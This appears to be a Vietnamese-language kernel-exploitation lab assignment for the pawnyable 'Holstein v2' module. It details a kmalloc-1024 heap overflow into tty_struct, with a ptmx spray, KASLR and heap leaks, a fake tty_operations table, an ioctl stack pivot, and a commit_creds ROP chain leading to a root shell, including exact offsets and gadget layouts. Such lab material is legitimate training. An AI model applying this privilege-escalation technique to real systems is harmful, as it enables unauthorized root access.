# Task6 — Holstein v2: heap overflow vao tty_struct

Tai lieu goc:

~~~text
/home/huhu/pwn-labs/resource/kernel/notes/LKE/LK01/HolsteinV2/README.md
/home/huhu/pwn-labs/resource/kernel/pawnyable/learn/linux-kernel/LK01-2/src/vuln.c
~~~

Task nay noi tiep Task5. May da biet stack overflow, kROP, KPTI va leak KASLR;
diem moi lan nay la kernel heap, SLUB cache, heap spray va control-flow qua
mot object khac nam cung kmalloc-1024.

## Muc tieu cuoi

~~~text
heap overflow trong g_buf
        ↓
kmalloc-1024 overlap voi tty_struct
        ↓
leak kernel + leak dia chi g_buf
        ↓
ghi de tty->ops
        ↓
fake tty_operations
        ↓
ioctl goi pivot gadget
        ↓
ROP trong g_buf
        ↓
prepare_kernel_cred(NULL) -> commit_creds
        ↓
KPTI trampoline
        ↓
shell root
~~~

Dieu kien qua bai:

~~~text
/ $ id
uid=1337 gid=1337 groups=1337

/ $ ./solve
/ # id
uid=0(root) gid=0(root)
~~~

Boot thanh cong, leak nhin hop le hoac agent tu chay thu khong tinh la Huhu
solve. May phai tu viet solve.c va gui code/log.

## Artifact

~~~text
bzImage          Linux 5.15.0 cua dung lab V2
huhu             ELF symbols duoc phuc hoi tu bzImage
vuln.c           source module V2
vuln.ko          module dung vermagic 5.15.0
initramfs-root/  rootfs co /dev/ptmx, insmod va shell uid 1337
setup.sh
run.sh
debug.sh
~~~

Chua co solve.c va chua co /root/solve; may tu tao.

## Mental model

V1 dat buffer tren kernel stack. V2 doi sang:

~~~c
g_buf = kmalloc(0x400, GFP_KERNEL);
~~~

module_write() nhan count khong gioi han roi copy truc tiep vao g_buf:

~~~c
copy_from_user(g_buf, buf, count);
~~~

Vi vay write(fd, payload, 0x420) ghi duoc 0x20 byte vuot khoi allocation
0x400. Muc tieu ke ben la mot tty_struct cung duoc cap tu cache
kmalloc-1024.

module_read() cung khong gioi han count, nen read(fd, leak, 0x500) co the
doc qua cuoi g_buf vao object ke ben.

## Contract cua object

### g_buf

~~~text
type:       char * global trong module
allocation: kmalloc(0x400, GFP_KERNEL)
owner:      module vuln
lifetime:   tu open("/dev/holstein") den close
read:       count khong gioi han
write:      count khong gioi han
primitive:  heap overread + heap overflow
~~~

### tty_struct trong image nay

Day la layout can tu xac nhan bang leak/GDB, khong suy ra theo kernel khac:

~~~text
tty object bat dau xap xi tai g_buf + 0x400
tty->ops nam tai tty + 0x18
~~~

Vi vay trong leak cua build nay:

~~~text
qword tai offset 0x418 la kernel pointer cua tty->ops
qword tai offset 0x438 la mot heap pointer dung de suy ra g_buf
~~~

Quan he can kiem chung:

~~~c
kernel_leak = leak[0x418 / 8];
heap_leak   = leak[0x438 / 8];
g_buf       = heap_leak - 0x438;
~~~

0x438 va offset tty->ops la contract cua image nay. Neu GDB cho layout khac,
dung lai va gui log, dung sua bang doan mo.

## Spray va ownership

Dung khoang 100 FD /dev/ptmx de cap nhieu tty_struct trong cung cache. Trinh tu:

~~~text
open 50 ptmx
open /dev/holstein
open 50 ptmx
~~~

Mang spray thuoc userland; moi entry la mot FD giu mot tty_struct song. Khong
dong spray truoc khi xong leak va trigger.

/dev/ptmx di qua tty_ioctl(). Sau tty_paranoia_check(), duong mac dinh co the
goi:

~~~c
tty->ops->ioctl(tty, cmd, arg);
~~~

Muc tieu cua overflow la doi tty->ops thanh dia chi g_buf, noi may dat fake
operations table.

## C1 — leak object va kernel base

Viet buoc leak truoc, chua ROP:

~~~text
open spray + device
read(fd, leak, 0x500)
dump qword 0x400..0x4ff
~~~

Phai chung minh:

~~~text
leak[0x418/8] la kernel text pointer
leak[0x438/8] la heap pointer
g_buf = leak[0x438/8] - 0x438
~~~

Static base cua image la 0xffffffff81000000. Tu huhu, tu lay offset tinh cua
pointer leak va tinh:

~~~text
kbase = kernel_leak - static_offset_of_same_pointer
~~~

Khong dung vmmap de dua runtime address vao solve.c. vmmap chi dung doi chieu
khi debug.

## C2 — calibrate function-pointer slot

Truoc khi dat ROP that, dung fake table co marker:

~~~text
fake_ops[i] = 0xffffffffdead0000 + (i << 8)
~~~

Ghi tty->ops = g_buf, sau do goi:

~~~c
ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
~~~

Muc tieu la doc crash log va xac dinh slot function duoc goi. Voi dung image V2
nay, resource ghi nhan:

~~~text
RIP = 0xffffffffdead0c00
~~~

Nghia la function pointer duoc goi nam o fake table index 12, offset 0x60.
Day la ly do qword thu 12 cua payload phai dong thoi la pivot gadget.

Khong bo qua calibration: no giup may phan biet tty->ops pointer,
function-table offset va dia chi RIP bi dieu khien.

## C3 — pivot

Pivot can dat:

~~~text
fake_ops[12] = pivot
ioctl(..., arg = g_buf - 0x10)
~~~

Pivot cua image nay co dang tuong duong:

~~~text
push rdx
mov  ebp, constant
pop  rsp
pop  r13
pop  rbp
ret
~~~

Vi rdx nhan arg tu ioctl, g_buf - 0x10 lam pop rsp tro vao vi tri dung de ret
lay qword dau tien cua ROP trong g_buf.

Invariant:

~~~text
g_buf phai la dia chi heap runtime da leak
arg phai tinh tu g_buf runtime
fake_ops[12] phai la pivot, khong phai userland address
~~~

## C4 — kernel ROP

ROP trong g_buf dung lai mental model Task5, nhung stack khong con la kernel
stack overflow:

~~~text
pop rdi ; ret
0
prepare_kernel_cred
pop rcx ; ret
0
mov rdi, rax ; rep movsq ... ; ret
commit_creds
...
swapgs_restore_regs_and_return_to_usermode + 0x16
0
0
user_rip
user_cs
user_rflags
user_rsp
user_ss
~~~

Gadget mov rdi, rax; rep movsq; ret bat buoc co rcx = 0. Neu khong, no se copy
qua dia chi do rdi/rsi chi toi va lam hong kernel.

Chi tiet rieng cua bai: qword index 12 vua la fake_ops[12] de trigger pivot,
vua duoc chain phu dung lam gia tri qua pop rcx. Phai giu invariant do khi
dung payload.

## Artifact may phai tu viet

~~~text
/home/huhu/my-research/kernel/tasks/task6/solve.c
/home/huhu/my-research/kernel/tasks/task6/initramfs-root/root/solve
~~~

Nen tu viet cac helper:

~~~c
save_state()
open_device_and_spray()
leak_heap_and_kernel()
build_probe_table()
calibrate_ioctl_slot()
build_fake_ops()
build_krop()
trigger_all_sprays()
get_shell()
~~~

Khong copy nguyen HolsteinV2/exp/exploit.c. Co the doc resource de hieu API,
nhung code nop phai do may tu dung va log duoc tung checkpoint.

## Build, pack, run

~~~bash
cd ~/my-research/kernel/tasks/task6
gcc -Wall -Wextra -O0 -g -static solve.c -o solve
cp solve initramfs-root/root/solve
./setup.sh
./run.sh
~~~

Neu cong GDB 1234 dang bi QEMU khac giu, dung:

~~~bash
TASK_GDB_PORT=1235 ./run.sh
~~~

Trong guest:

~~~sh
id
/root/solve
id
~~~

Debug kernel:

Terminal 1:

~~~bash
cd ~/my-research/kernel/tasks/task6
./debug.sh
~~~

Terminal 2:

~~~bash
cd ~/my-research/kernel/tasks/task6
gdb ./huhu
~~~

Trong GDB:

~~~gdb
set architecture i386:x86-64
target remote :1234
continue
~~~

Neu dung `TASK_GDB_PORT=1235 ./debug.sh` thi thay bang `target remote :1235`.

Khi can xem crash:

~~~gdb
info registers
x/32gx $rsp
~~~

## Dieu kien qua bai

Chi gui khi co du:

~~~text
1. solve.c tu viet
2. log kernel leak + heap leak + kbase + g_buf
3. log calibration hoac giai thich slot ioctl
4. output sau trigger:
   uid=0(root) gid=0(root)
~~~

Tao se review code va log cua may sau checkpoint; tao khong tu danh dau hoan
thanh tu boot smoke-test hay self-test cua agent.
